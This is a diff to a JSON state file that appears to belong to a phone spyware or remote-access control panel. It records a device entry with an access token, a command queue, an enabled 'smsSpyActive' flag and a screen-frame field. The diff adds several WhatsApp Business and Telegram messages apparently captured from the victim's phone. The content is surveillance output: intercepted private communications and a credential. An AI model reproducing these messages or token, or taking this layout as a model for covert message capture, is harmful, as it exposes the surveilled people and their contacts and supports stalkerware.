@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775631333441,
+    "lastSeen": 1775631336547,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "‎JB || KHAFA X NAZRIEL (3 pesan): ~ Khafa Store",
+        "content": "bgi tele dev nya dong",
+        "time": "08/04 13:55",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775631337125
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:55",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775631336108
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:55",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775631335720
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Sending video...",
+        "time": "08/04 13:55",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775631335674
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
